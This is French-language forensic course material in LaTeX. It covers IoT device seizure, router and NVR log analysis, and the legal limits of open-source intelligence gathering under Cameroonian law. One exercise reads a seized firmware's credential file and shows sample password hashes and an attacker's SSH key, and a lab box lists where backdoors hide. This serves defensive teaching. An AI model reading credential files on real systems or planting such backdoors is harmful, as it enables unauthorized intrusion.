# Ou via commande propriétaire :
wl assoclist              # Clients actuellement connectes
cat /proc/net/arp         # Cache ARP (connexions recentes)

# Logs DNS (si dnsmasq actif avec logging)
cat /tmp/dnsmasq.log
# Format : timestamp IP-client query type domain
# 2026-01-15 14:22:05 192.168.1.42 A medequip-portugal.com
# -> le client .42 a resolu ce domaine (phishing !)

# Volume de trafic par client (utile pour detecter exfiltration)
cat /proc/net/ip_conntrack | awk '{print $5}' | \
    cut -d= -f2 | sort | uniq -c | sort -rn | head -10

# IMPORTANT : les Box operateurs sauvegardent aussi les logs
# sur leurs serveurs centraux. Complement indispensable via
# requisition art. 57 Loi 2010/012 aupres de MTN/Orange.
\end{lstlisting}
\end{boxoutils}

\subsection{Compteurs prépayés~: manipulation et traces}

Les compteurs électriques prépayés (système SONATREL) utilisent
des tokens prépayés transmis par SMS ou via un clavier.
Les fraudes incluent~: modification du firmware pour altérer
les mesures, utilisation de tokens volés, court-circuit du compteur.

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Type de fraude} &
    \tableauHeader{Trace forensique} &
    \tableauHeader{Où la trouver}
}
Modification firmware & Firmware non signé ou corrompu &
    Extraction UART/JTAG~; vérification signature du fabricant \\
Utilisation tokens volés & Tokens non générés par SONATREL &
    Logs de la base de données tokens SONATREL (réquisition) \\
Court-circuit du compteur & Absence de données de consommation
    sur la période fraudée &
    Logs du concentrateur PLC/RF de SONATREL~; relevés voisins \\
Clonage du numéro de série & Deux compteurs avec le même SN &
    Base de données SONATREL~; inspection physique \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~18.2. Fraudes compteurs prépayés et traces forensiques}\end{center}

% ============================================================================
\section{Principes de Custody pour les Preuves IoT}
\label{sec:custody-iot}
% ============================================================================

\subsection{Défis spécifiques à l'IoT}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Défi} &
    \tableauHeader{Impact forensique} &
    \tableauHeader{Mitigation}
}
Absence de write blocker standardisé &
    Connexion à l'interface admin peut modifier les logs &
    Documenter chaque connexion~; ne jamais écrire via SSH \\
Volatilité extrême de la RAM &
    Les logs en RAM disparaissent en secondes &
    Exporter immédiatement~; documenter l'heure d'export \\
Horloge non synchronisée &
    Dérive de l'horloge rend les logs inutilisables &
    Mesurer la dérive NTP au moment de la saisie~;
    corriger dans la timeline \\
Firmware propriétaire &
    Difficile à analyser sans outils du fabricant &
    Binwalk~; contacter le fabricant via réquisition \\
Alimentation continue &
    Couper l'alimentation efface la RAM &
    Exporter d'abord~; couper seulement quand prêt \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~18.3. Défis custody IoT et mitigations}\end{center}

\subsection{Protocole de saisie IoT}

\begin{boxPNC}
\textbf{Protocole. Saisie d'un appareil IoT (routeur, caméra, DVR)}

\begin{enumerate}
    \item \textbf{Ne pas éteindre immédiatement.}
          Photographier l'état des LEDs, des câbles connectés,
          l'écran si présent. Documenter l'IP affichée.
    \item \textbf{Tenter l'accès à l'interface admin} (SSH, web,
          Telnet)~: exporter les logs volatils en priorité.
          Si l'accès échoue~: passer à l'étape~5.
    \item \textbf{Vérifier la synchronisation horaire.}
          Comparer l'heure de l'appareil avec une référence GPS.
          Documenter la dérive exacte (ex.~: ``2026-03-13~14h22
          affiché sur l'appareil~= 14h25 heure GPS, dérive~: +3~min'').
    \item \textbf{Exporter les données volatiles}~: syslog, dmesg,
          table ARP, connexions actives, baux DHCP. Calculer le hash
          SHA-256 de chaque fichier exporté.
    \item \textbf{Couper l'alimentation proprement} (via commande
          \texttt{halt} ou \texttt{poweroff} si possible)~; sinon
          débrancher l'alimentation. Ne jamais appuyer sur le
          bouton reset.
    \item \textbf{Retirer les supports amovibles} (SD Card, USB)
          \emph{avant} de couper l'alimentation~: ils constituent
          des preuves indépendantes.
    \item \textbf{Documenter et sceller~:} étiquette avec N° dossier
          N° evidence, date/heure, OPJ~; sachet antistatique
          (important pour l'électronique).
    \item \textbf{Transport}~: protection antistatique et
          antichoc~; jamais dans le même sachet que d'autres
          appareils électroniques.
\end{enumerate}
\end{boxPNC}

\separateur

% --- Encadré lab NDAP SUKULU ---
\begin{boiteRemarque}{Notions mobilisées par le laboratoire INA-LAB-06}
\begin{itemize}
    \item \textbf{Intégrité du firmware}~: \texttt{sha256sum firmware.bin}
          donne une empreinte de 64~caractères hexadécimaux, à comparer
          caractère par caractère à celle du procès-verbal de saisie.
    \item \textbf{Où se cache une porte dérobée}~: un compte supplémentaire
          d'UID~0 dans \texttt{etc/passwd} (troisième champ), une clé dans
          \texttt{root/.ssh/authorized\_keys} (dossier caché~:
          \texttt{ls -la}), un service lancé au démarrage par les scripts
          \texttt{etc/inittab} ou \texttt{etc/init.d/rcS} (par exemple un
          shell sans authentification sur un port), une tâche planifiée.
    \item \textbf{Journal du VMS}~: chaque ligne dit qui a regardé en
          direct (\texttt{LIVE}), relu (\texttt{PLAYBACK}), exporté
          (\texttt{EXPORT}) ou supprimé (\texttt{DELETE}) quel enregistrement
          de quelle caméra, et depuis quelle adresse~; on compte les suppressions et on cherche la
          caméra visée par la séquence complète.
\end{itemize}
\end{boiteRemarque}

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Ne pas éteindre en premier~:} contrairement aux PC,
          les appareils IoT stockent leurs logs principalement en RAM.
          Exporter les logs via l'interface admin \emph{avant} toute
          extinction.

    \item \textbf{Synchronisation horaire obligatoire~:} mesurer la
          dérive de l'horloge IoT par rapport à une référence GPS
          au moment de la saisie~; corriger dans la timeline. Sans
          cette correction, les logs IoT sont inexploitables pour
          la corrélation temporelle.

    \item \textbf{Binwalk~:} outil universel d'analyse de firmware.
          Identifie et extrait les systèmes de fichiers, les images
          compressées, les signatures. \texttt{binwalk -e firmware.bin}
          puis analyser le SquashFS extrait.

    \item \textbf{UART~:} accès console root sur presque tout
          appareil embarqué. Matériel~: adaptateur USB-UART ($\approx$~5~USD).
          Documenter photographiquement avant ouverture du boîtier
          (ACPO Principe~2).

    \item \textbf{DVR/NVR~:} exporter d'abord via interface web~;
          si effacement suspect~: extraire le HDD, image DD avec
          write blocker, carving vidéo avec \texttt{bulk\_extractor}
          ou \texttt{foremost}.

    \item \textbf{Vérifier la synchronisation horaire du NVR~:} une
          dérive de quelques heures invalide la corrélation avec
          les autres sources de la timeline.

    \item \textbf{Contexte camerounais~:} logs DNS des Box opérateurs
          (dnsmasq)~; historique connexions Wi-Fi (table ARP,
          \texttt{hostapd\_events.log})~; toujours compléter par
          réquisition opérateur (art.~57 Loi~2010).

    \item \textbf{Factory reset~:} n'efface pas systématiquement
          la SD Card~; n'efface pas le firmware~; laisse des traces
          dans les logs opérateur. Saisir physiquement avant
          tout reset.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~18.1. Priorité de collecte IoT \niveaubase}]
Vous arrivez sur la scène d'un cybercafé de Yaoundé. Un routeur TP-Link
sous OpenWRT est allumé~; l'écran du propriétaire affiche une interface
web indiquant que le routeur est connecté à Internet. Vous suspectez
qu'il a servi de point d'accès pour une fraude en ligne.
\begin{enumerate}[(a)]
    \item Listez vos actions dans l'ordre exact (6~étapes minimum),
          en justifiant chaque priorité par la volatilité des données.
    \item Quelles données exportez-vous en priorité absolue, et
          pourquoi~? Donnez les commandes exactes.
    \item Si le propriétaire tente de réinitialiser le routeur
          pendant que vous l'examinez, que faites-vous~? Quelles
          preuves subsisteraient malgré le reset~?
    \item Calculez et documentez les hachages SHA-256 des
          exports~: à quel moment dans la séquence d'actions~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~18.2. Analyse firmware \niveaumoyen}]
Le firmware \texttt{mtnbox\_fw\_v3.2.bin} a été extrait d'une MTN Box
saisie. \texttt{binwalk mtnbox\_fw\_v3.2.bin} révèle un SquashFS à
l'offset \texttt{0x20000}. Après extraction~:
\begin{lstlisting}[language=bash_forensique]
cat /mnt/firmware/etc/shadow
# root:$1$salt$abc123defghi:18000:0:99999:7:::
# admin:$1$salt$xyz789uvwxyz:18000:0:99999:7:::

find /mnt/firmware/ -name "authorized_keys"
# /mnt/firmware/root/.ssh/authorized_keys
cat /mnt/firmware/root/.ssh/authorized_keys
# ssh-rsa AAAAB3NzaC1yc2E... root@185.220.XX.XX
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Identifiez les indicateurs de compromission dans ce firmware.
    \item Quel type d'accès la clé SSH autorisée permet-elle~?
          Quelle IP contrôle cette clé (comment le savez-vous)~?
    \item Comment vérifier si ce firmware est une version modifiée
          par rapport au firmware officiel du fabricant~? Quelle
          commande utilisez-vous~?
    \item Rédigez la constatation forensique correspondante, puis
          l'analyse avec niveau de confiance.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~18.3. Timeline IoT multi-sources \niveauexpert}]
Dans l'affaire MBONGO (Chapitre~8~(UE~SEC4031)), la caméra IP
installée dans le bureau comptabilité de SONATRAV~SA est au c\oe ur
de l'investigation~: elle aurait enregistré MBONGO en train de
manipuler le système de virement. Le NVR Hikvision affiche dans
ses logs~:
\begin{lstlisting}[language=bash_forensique]
[2026-01-15 13:50:22] LOGIN  admin  192.168.5.14  Success
[2026-01-15 13:50:45] PLAYBACK  admin  Camera-Bureau-Compta
                       2026-01-15 12:30 -> 13:00
[2026-01-15 13:51:02] DELETE  admin  Camera-Bureau-Compta
                       2026-01-15 12:00 -> 14:00
[2026-01-15 13:51:08] EXPORT  admin  Camera-Couloir-1
                       2026-01-15 12:00 -> 14:00 -> USB1
\end{lstlisting}
L'heure GPS lors de la saisie du NVR est 14h28. L'heure affichée
sur le NVR est 14h21 (dérive~: --7~minutes).
\begin{enumerate}[(a)]
    \item Corrigez les horodatages NVR pour les aligner sur l'heure
          réelle. Que devient l'horodatage du DELETE~?
    \item Que révèlent les logs NVR sur les intentions de l'auteur~?
          Quelles données ont été supprimées~? Quelles données
          ont été exportées~? Pourquoi cette distinction est-elle
          significative~?
    \item Les enregistrements supprimés (12h00--14h00) sont-ils
          récupérables~? Quelle procédure appliquez-vous~?
    \item L'IP \texttt{192.168.5.14} a accédé au NVR. Comment
          identifier la machine correspondante~? Quelles sources
          corroborent cette identification~?
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Clôture de la Partie~IV.} Ce chapitre clôt la Partie~IV
(Techniques Avancées). Les cinq chapitres de cette partie ont
couvert~: Forensique Système (Ch.~\ref{chap:for-sys}), Forensique
Réseau (Ch.~\ref{chap:for-res}), Forensique Mobile
(Ch.~\ref{chap:for-mob}), Forensique Cloud (Ch.~\ref{chap:for-cloud})
et ce chapitre (IoT/Embarqué).

La \textbf{Partie~V} aborde les contre-mesures~: Anti-Forensique
(Ch.~19. techniques d'effacement et obfuscation~; comment les
détecter et les documenter) et les investigations avancées
(Ch.~20--22). La connaissance de l'anti-forensique est indissociable
de la maîtrise des techniques forensiques présentées dans
cette Partie~IV.
\end{boxinfo}

        % ============================================================================
% Fichier  : partie4/P04_C19_OSINT_Comprehension_Attaques.tex
% Titre    : OSINT et Compréhension des Attaques
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Octobre 2026
% ============================================================================
\chapter{OSINT et Compréhension des Attaques}
\label{chap:for-osint}

\epigraph{%
    « La source ouverte n'affranchit pas de la loi ; elle l'oblige davantage. »%
}{Thierry MINKA}


\noindent\textbf{Niveau :} Intermédiaire • Lecture des Chapitres 4 (fondements théoriques), 6 (Processus Investigatif Universel), 8 (chaîne de custody) et 12 (droit camerounais) de l'UE SEC4031 recommandée. Ce chapitre applique les fondements de la Partie I et les procédures de la Partie II à une technique d'investigation spécifique : le renseignement en source ouverte et la lecture d'une attaque par ses traces.

\begin{boxobjectifs}
À la fin de ce chapitre, l'étudiant sait :
\begin{itemize}
\item distinguer ce qui relève de la source ouverte de ce qui relève d'un acte d'enquête soumis à autorisation ;
\item conduire une recherche en sources ouvertes sur une personne, une organisation, un domaine ou une adresse, selon le cycle du renseignement ;
\item cartographier les liens entre identités, comptes et infrastructures ;
\item tracer un flux de cryptoactifs sur une chaîne de blocs publique et identifier le point où l'entraide devient nécessaire ;
\item documenter une constatation en ligne de façon qu'elle ait une valeur probante : source, date, empreinte, procès-verbal ;
\item reconnaître les phases d'une attaque à partir de leurs traces et rattacher chaque comportement à un texte de la Loi 2010/012~\cite{cameroun2010a} ou du Code pénal ;
\item analyser un courriel et un site frauduleux et en tirer les demandes utiles à l'enquête ;
\item lire et discuter le rapport d'un expert en intrusion selon la distinction \emph{Examination / Analysis} du NIST SP 800-86~\cite{nist80086}.
\end{itemize}
\end{boxobjectifs}

\section{Introduction}

Dans une enquête de cybercriminalité, une part déterminante de l'information est accessible sans acte coercitif : identité derrière un pseudonyme, ancienneté d'un domaine frauduleux, localisation d'un hébergeur, parcours d'un flux de cryptoactifs, marque imitée par une page de collecte. Ces éléments se lisent dans des sources ouvertes, sans réquisition ni mandat. Encore faut-il les rechercher avec méthode, les recouper avec prudence et documenter chaque constatation de manière à ce qu'elle survive à l'épreuve de l'audience.

L'autre versant de ce chapitre répond à une question structurelle : face à un système compromis, comment reconstituer une attaque, dans quel ordre, et sous quelle qualification ? L'enquêteur n'est pas un attaquant et ne saurait le devenir. Il doit en revanche reconnaître les phases d'une intrusion à partir des traces qu'elles laissent, savoir quel texte réprime chaque comportement, et lire un rapport d'expert sans se laisser impressionner par le vocabulaire technique.

Deux principes structurent la démarche :

\begin{enumerate}
\item \textbf{La source ouverte n'affranchit pas de la loi.} Une information rendue publique par son sujet se consulte ; y accéder par un compte forcé, un faux profil ou une intrusion demeure une infraction. La frontière entre \emph{consulter} et \emph{accéder} est la ligne de conduite de tout le chapitre.
\item \textbf{On qualifie une attaque par ses traces, non par le récit de l'attaquant.} Chaque phase d'une intrusion laisse des traces identifiables (Ch. 14 et 15) ; chacune se rattache à un texte précis (Ch. 12, UE SEC4031). L'enquête consiste à relier les deux.
\end{enumerate}

\begin{boxinfo}
\textbf{Transition depuis la Partie IV.} Les Chapitres 14 à 18 ont couvert l'analyse forensique des systèmes, réseaux, mobiles, cloud et IoT. Ce chapitre complète la Partie IV en traitant une source d'information complémentaire, les sources ouvertes, et en formalisant la lecture d'une attaque comme grille de qualification. Il prolonge directement la démarche du Chapitre 3 de l'UE SEC4031 (analyse de la Kill Chain dans l'affaire MVOM) et prépare le Chapitre 20 (rédaction du rapport forensique).
\end{boxinfo}

\section{Fondements de l'OSINT et cadre légal}

\subsection{Définition et périmètre}

\begin{boxdef}
\textbf{Renseignement en source ouverte (OSINT)}~:
Collecte et analyse d'informations accessibles au public, sans recourir à un acte coercitif ni à un accès réservé : sites web, profils publics de réseaux sociaux, registres officiels, archives, bases de données publiques, décisions de justice publiées, résultats de moteurs de recherche.
\end{boxdef}

La source ouverte se définit autant par ce qu'elle exclut. Ne relèvent pas de l'OSINT et supposent un acte d'enquête ou une autorisation : l'accès à un compte privé, même au moyen d'un identifiant trouvé ailleurs ; la création d'un faux profil pour entrer dans un cercle fermé ; l'interception d'une communication ; l'obtention des données d'un opérateur ; l'accès à un système en s'affranchissant d'une mesure de sécurité. La frontière tient en une phrase : \textbf{on consulte ce qui est public, on n'accède pas à ce qui est protégé.}

\subsection{La recherche en sources ouvertes parmi les actes d'enquête}

La recherche en sources ouvertes est un acte d'enquête comme un autre : elle se rattache à une procédure, s'exécute sur instructions ou sous la direction de l'OPJ et se consigne dans un procès-verbal. Elle n'échappe ni au secret de l'enquête ni aux règles de protection des données : la systématisation d'une collecte, son croisement avec des données non publiques ou son emploi à une autre fin que l'enquête en cours peuvent entrer en conflit avec la Loi 2024/017~\cite{cameroun2024donnees}.

Dans le cadre du Processus Investigatif Universel (Ch. 6, UE SEC4031), la recherche en sources ouvertes s'inscrit principalement dans la \textbf{Phase 1 (Initialisation et Cadrage)}, pour l'évaluation préliminaire et la planification, et dans la \textbf{Phase 2 (Acquisition et Préservation)}, pour la collecte d'éléments probatoires. Elle intervient également dans l'\textbf{Étape E6 (Identification et Cartographie des Parties Prenantes)} de la Phase 2.

\subsection{La frontière entre consultation et accès}

\begin{longtable}{p{0.48\linewidth}p{0.48\linewidth}}
\rowcolor{TableauEntete}\textcolor{white}{\bfseries Consultation licite en source ouverte} & \textcolor{white}{\bfseries Accès ou acte soumis à autorisation} \\ \hline
Lire un profil ou une publication réglés sur « public » & Se connecter à un compte, même avec un identifiant trouvé ailleurs \\
Consulter un registre officiel, une archive, un résultat de moteur & Créer un faux profil pour entrer dans un cercle fermé \\
Lire les transactions publiques d'une chaîne de blocs & Obtenir l'identité d'un client auprès d'une plateforme \\
Relever les services exposés par une adresse dans un moteur d'inventaire & Se connecter à un service exposé sans droit \\
Consulter les informations d'enregistrement publiques d'un domaine & Intercepter une communication \\
\end{longtable}

\begin{boxjuris}
\textbf{Les textes qui tracent la frontière}
\textbf{Art. 65 (2) Loi 2010/012} : l'accès sans droit à tout ou partie d'un réseau, d'un système d'information ou d'un équipement terminal est puni de cinq à dix ans d'emprisonnement et de 5 à 10 millions de francs d'amende, ou de l'une de ces peines. \textbf{Art. 65 (4)} : la même peine frappe l'accès « par défi intellectuel ». \textbf{Art. 69} : l'accès sans droit et en violation des mesures de sécurité, afin d'obtenir des informations, est puni de cinq à dix ans et de 10 à 100 millions. Le sursis est exclu pour ces infractions \textbf{[art. 89]}.
\end{boxjuris}

\begin{boxalert}
L'article 65 (4) réprime l'accès « par défi intellectuel », sans mobile de gain ni de nuisance. Un enquêteur qui, ayant repéré un système exposé, s'y connecte « pour vérifier » commet l'infraction qu'il est chargé de poursuivre. Le repérage se consigne ; l'accès se demande par la voie légale.
\end{boxalert}

\subsection{Vie privée et protection des données}

La collecte en sources ouvertes touche à des données à caractère personnel. Deux corps de règles l'encadrent.

\begin{itemize}
\item \textbf{Le respect de la vie privée} est protégé par la Loi 2010/012 : droit au respect de la vie privée \textbf{[art. 41]}, confidentialité des communications \textbf{[art. 42]}, interdiction d'intercepter, d'écouter ou de stocker des communications sans consentement ou autorisation légale \textbf{[art. 44]}, répression des atteintes à l'intimité et de la collecte de données nominatives par des moyens illicites \textbf{[art. 74]}.
\item \textbf{La protection des données à caractère personnel} relève de la Loi 2024/017. La collecte frauduleuse ou déloyale de données est réprimée \textbf{[art. 63]} ; le traitement doit répondre à une finalité déterminée et l'usage des données recueillies pour l'enquête ne peut être détourné vers une autre fin. L'adresse IP est explicitement une donnée personnelle \textbf{[art. 5]}.
\end{itemize}

\begin{boxCRO}
\textbf{Analyse CRO · Recherche en sources ouvertes}
\textbf{Confidentialité (C)} : la recherche en sources ouvertes ne collecte que des informations publiques, mais leur agrégation et leur croisement peuvent révéler des éléments relevant de la vie privée. La proportionnalité de la collecte (art. 9-11 Loi 2024/017) est la contre-mesure.

\textbf{Fiabilité (R)} : les informations publiques sont par nature de fiabilité variable (déclaratif, possible usurpation d'identité). Le recoupement multi-sources et la distinction constatation/analyse sont les garanties de fiabilité.

\textbf{Opposabilité (O)} : la documentation rigoureuse (procès-verbal, capture horodatée, empreinte) est la condition de l'opposabilité. Sans elle, la constatation est irrecevable.

\textbf{Impact CRO} : \texttt{C: ↓ proportionnalité \quad R: ~ recoupement \quad O: ↑↑ documentation}
\end{boxCRO}

\begin{boxexo}
\textbf{Exercice~:Tracer la frontière}
Pour chacune des situations suivantes :
\begin{enumerate}
\item l'administrateur présumé d'un site frauduleux a un compte de réseau social public : que pouvez-vous en faire sans autorisation ?
\item son compte de messagerie exige une invitation : que ne pouvez-vous pas faire et par quelle voie obtenir l'information recherchée ?
\item une adresse Bitcoin est publique : jusqu'où va la consultation et à partir de quand faut-il une réquisition ou l'entraide ?
\end{enumerate}
Pour chaque réponse, citez le texte applicable.

\textbf{Durée :} 40 minutes. Corrigé en séance.
\end{boxexo}

\begin{boxresume}
\begin{itemize}
\item On consulte ce qui est public, on n'accède pas à ce qui est protégé.
\item La recherche en sources ouvertes est un acte d'enquête : procédure, direction de l'OPJ, procès-verbal.
\item Vie privée et données personnelles : Lois 2010/012 et 2024/017.
\item Identité d'un compte, interception, infiltration, accès : chacun exige son acte ou son autorisation.
\item Analyser chaque technique selon le Trilemme CRO (Confidentialité · Fiabilité · Opposabilité).
\end{itemize}
\end{boxresume}

\section{Recherche sur les personnes et les organisations}

\subsection{Rechercher par le nom et l'identité}

\begin{longtable}{p{0.28\linewidth}p{0.68\linewidth}}
\rowcolor{TableauEntete}\textcolor{white}{\bfseries Source} & \textcolor{white}{\bfseries Usage} \\ \hline
Moteurs de recherche & Rechercher le nom exact entre guillemets, avec ses variantes (accents, alias) ; croiser avec la ville, l'employeur, une fonction. Restreindre à un site ou à un type de fichier pour retrouver un document précis. \\
Journal officiel et registres & Journal officiel : nominations, actes officiels. Registre du commerce et du crédit mobilier : dirigeants et sociétés. Ces sources publiques identifient les responsables d'une entreprise mise en cause. \\
Décisions publiées & Décisions de justice et actes administratifs rendus publics, utiles pour un antécédent connu ou une fonction. \\
Archives web & Copies archivées de pages supprimées, qui rétablissent un contenu retiré depuis la commission des faits. \\
\end{longtable}

Une adresse électronique ou un numéro relie souvent plusieurs comptes. Des services publics permettent de savoir si une adresse figure dans une fuite de données connue, ce qui révèle les services où un compte a été ouvert. Ces indications orientent l'enquête ; elles ne valent pas identification et se recoupent.

\subsection{Les réseaux sociaux}

Les profils réglés sur « public » sont consultables : publications, photographies, lieux mentionnés, relations affichées, dates. Chaque réseau se recherche avec ses propres outils de recherche interne. Deux règles : ne consulter que le public ; dater et capturer chaque contenu (une publication publique aujourd'hui peut disparaître demain).

\begin{boxalert}
Un nom affiché, une photographie de profil et une biographie sont déclaratifs. Un compte peut être ouvert sous une fausse identité, une photographie peut être empruntée, une localisation peut être paramétrée. Le compte est un point de départ ; l'identité se démontre par le recoupement et, en définitive, par une réquisition auprès de la plateforme.
\end{boxalert}

\subsection{Relier des comptes par le pseudonyme et par l'image}

Une même personne réutilise souvent le même pseudonyme sur plusieurs plateformes. Des outils libres recherchent un nom d'utilisateur donné sur un grand nombre de sites et signalent où il existe un compte. Le résultat est une \textbf{liste de pistes à vérifier}, non une preuve d'appartenance : deux personnes peuvent partager un pseudonyme et un compte peut être une usurpation.

La recherche d'image inversée retrouve les autres pages où une même photographie apparaît : elle révèle une photographie de profil volée, d'autres comptes utilisant la même image, ou une origine plus ancienne.

\begin{boxartefact}{Métadonnées EXIF d'une image}
\textbf{Localisation :} intégrées au fichier image (EXIF), accessibles par \texttt{exiftool}.

\textbf{Informations typiquement contenues :} date et heure de prise de vue, coordonnées GPS, marque et modèle de l'appareil, paramètres de prise de vue.

\textbf{Valeur forensique :} les coordonnées GPS peuvent localiser précisément une personne à une date donnée (cf. Opération MBONGO, Ch. 16).

\textbf{Fragilité :} les métadonnées sont souvent supprimées par les plateformes de réseaux sociaux lors du téléversement. Leur absence n'est pas un indice négatif ; leur présence est un indice positif à documenter.
\end{boxartefact}

\subsection{Les organisations}

Pour une société, croiser le registre du commerce (dirigeants, siège), le site officiel, les mentions légales, les profils professionnels des dirigeants et les documents publics. L'objectif est d'établir qui décide, qui signe et qui détient, éléments utiles à la qualification et à la désignation des personnes à entendre.

\begin{boxCRO}
\textbf{Analyse CRO · Recherche sur les personnes}
\textbf{C} : l'agrégation d'informations publiques sur une personne peut reconstituer un profil relevant de la vie privée. La finalité déterminée (art. 9-11 Loi 2024/017) et la proportionnalité limitent cette atteinte.

\textbf{R} : les informations déclaratives (nom affiché, photo) sont de fiabilité faible. Le recoupement multi-sources (registres officiels + réseaux sociaux + archives) élève la fiabilité.

\textbf{O} : la documentation (procès-verbal, capture horodatée, empreinte) et la distinction constatation/analyse sont les conditions de l'opposabilité devant le tribunal.

\textbf{Impact CRO} : \texttt{C: ↓ finalité \quad R: ↑ recoupement \quad O: ↑↑ documentation}
\end{boxCRO}

\begin{boxexo}
\textbf{Exercice~:Construire un faisceau}
Sur un ensemble de comptes fictifs préparés pour l'exercice :
\begin{enumerate}
\item relevez toutes les informations publiques et capturez chacune avec sa source et sa date ;
\item déterminez ce que la recherche d'image établit sur la photographie de profil ;
\item distinguez, dans vos constatations, ce qui est établi, ce qui est probable et ce qui reste une simple piste ;
\item dressez la liste des réquisitions qui permettraient de confirmer l'identité, en indiquant le destinataire de chacune.
\end{enumerate}
\end{boxexo}

\begin{boxresume}
\begin{itemize}
\item Nom, adresse, numéro, pseudonyme et image sont des points de départ à recouper.
\item Registres officiels camerounais pour les personnes et les sociétés.
\item Un pseudonyme partagé est une piste, pas une preuve d'appartenance.
\item Une photographie de profil peut être empruntée : la recherche inversée le montre.
\item L'identité d'un compte se confirme par réquisition auprès de la plateforme.
\end{itemize}
\end{boxresume}

\section{Recherche sur les infrastructures}

\subsection{Le nom de domaine}

Les informations publiques d'enregistrement d'un domaine (protocole WHOIS) indiquent, quand elles ne sont pas masquées par un service de confidentialité, la date de création et d'expiration, le bureau d'enregistrement et les serveurs de noms. La \textbf{date de création} est un renseignement précieux : un domaine créé quelques jours avant une campagne frauduleuse est un indice fort.

Résolution d'un nom en adresse et lecture des enregistrements associés (adresses, serveurs de messagerie, enregistrements de vérification) : ces consultations sont publiques. Elles relient un domaine à des adresses et à une infrastructure de messagerie, sans aucun accès à un système.

\subsection{L'historique, les sous-domaines et les certificats}

L'historique des enregistrements révèle les adresses successives d'un domaine, même changées depuis les faits et les services d'hébergement utilisés. Les registres de certificats publient les certificats émis pour un domaine et font apparaître ses sous-domaines ; ils servent aussi à repérer des domaines qui imitent une marque, en recherchant les certificats émis pour des noms voisins. Les archives web conservent l'état passé d'un site disparu.

\subsection{L'adresse et son propriétaire}

Une adresse IP appartient à un bloc attribué à un opérateur, dans une région donnée. Les registres régionaux (dont le registre africain) indiquent, pour un bloc, l'organisation attributaire et le pays. Cette information oriente la coopération : elle dit à quel État et à quel fournisseur adresser la demande (Ch. 10, UE SEC4031). Les moteurs d'inventaire des systèmes exposés indiquent les services publiquement visibles sur une adresse, ce qui aide à comprendre une infrastructure ; les consulter est licite, s'y connecter ne l'est pas.

\begin{boxalert}
Le pays d'une adresse IP est celui de l'attribution du bloc, souvent celui de l'hébergeur, non nécessairement celui de la personne. Un service d'anonymisation ou un hébergement à l'étranger déplace l'adresse sans déplacer l'auteur. L'adresse désigne un point du réseau à un instant ; l'identification passe par le fournisseur.
\end{boxalert}

\subsection{Reconnaître un site qui imite une marque}

\begin{longtable}{p{0.34\linewidth}p{0.62\linewidth}}
\rowcolor{TableauEntete}\textcolor{white}{\bfseries Indice} & \textcolor{white}{\bfseries Lecture} \\ \hline
Le nom de domaine & Comparer au domaine légitime : ajout de mots (« -secure », « -login »), extension différente, faute discrète. \\
La date de création & Un domaine récent imitant une marque ancienne est suspect. \\
Le certificat & Émis récemment, pour un nom voisin de la marque. \\
Le contenu & Copie de l'apparence de la marque ; formulaire qui recueille identifiants ou informations de paiement. \\
L'hébergement & Souvent distinct de celui de la marque légitime. \\
\end{longtable}

Un site frauduleux est éphémère. Dès son signalement, en constater et en capturer le contenu (section suivante) : l'apparence, l'adresse, le formulaire, le code de la page tel qu'il est servi. Signaler ensuite le domaine à l'organisme national compétent et au titulaire de la marque imitée ; lorsque l'hébergeur est à l'étranger, demander la conservation par le réseau 24/7 ou l'entraide (Ch. 10, UE SEC4031).

\begin{boxCRO}
\textbf{Analyse CRO · Consultation d'infrastructures}
\textbf{C} : les informations WHOIS, DNS et certificats sont publiques par conception. L'atteinte à la confidentialité est nulle.

\textbf{R} : les données WHOIS peuvent être masquées (protection de confidentialité) ; les certificats sont fiables mais ne prouvent pas l'identité du titulaire. Le recoupement avec les archives web et les moteurs d'inventaire élève la fiabilité.

\textbf{O} : la consultation est licite et documentable. La capture horodatée et le procès-verbal de constatation sont les conditions de l'opposabilité.

\textbf{Impact CRO} : \texttt{C: → neutre \quad R: ↑ recoupement \quad O: ↑↑ documentation}
\end{boxCRO}

\begin{boxexo}
\textbf{Exercice~:Lire une infrastructure}
Sur un ensemble de domaines fictifs :
\begin{enumerate}
\item relevez la date de création, le bureau d'enregistrement, les serveurs de noms et l'adresse de chaque domaine ;
\item déterminez le pays et l'hébergeur de chaque adresse et dites à quel État adresser une demande de conservation ;
\item établissez en quoi un domaine donné est un site imitant une marque ;
\item rédigez la liste des démarches, dans l'ordre : capture, signalement, conservation, entraide.
\end{enumerate}
\end{boxexo}

\begin{boxresume}
\begin{itemize}
\item La date de création d'un domaine est un indice à relever systématiquement.
\item Historique, sous-domaines et certificats se consultent publiquement.
\item Le pays d'une adresse oriente l'entraide ; il ne localise pas la personne.
\item Un site imitant une marque se capture d'abord, se signale et se fait conserver ensuite.
\end{itemize}
\end{boxresume}

\section{Cartographie des liens et traçage des cryptoactifs}

\subsection{Cartographier les liens}

Au fil de la recherche, les entités se multiplient : personnes, pseudonymes, adresses électroniques, numéros, domaines, adresses IP, adresses de portefeuille. Une \textbf{carte des liens} les représente et fait apparaître les relations. La théorie des graphes (Ch. 4 de l'UE SEC4031, section 4.3) fournit le formalisme : $G = (V, E, w)$ où $V$ est l'ensemble des entités, $E$ l'ensemble des relations, $w$ le poids de chaque relation.

Sur la carte, chaque trait est justifié par une source, exactement comme chaque ligne d'un rapport. Un lien « probable » se distingue d'un lien « établi » par un trait différent ou une mention. La carte est une synthèse, non une preuve : elle guide l'enquête et illustre le rapport.

\subsection{Lire une chaîne de blocs publique}

Les principales chaînes de blocs sont publiques et permanentes : toute transaction est visible avec l'adresse concernée, ses entrées, ses sorties et ses montants. Un explorateur de chaîne de blocs affiche ces informations sans aucun accès réservé.

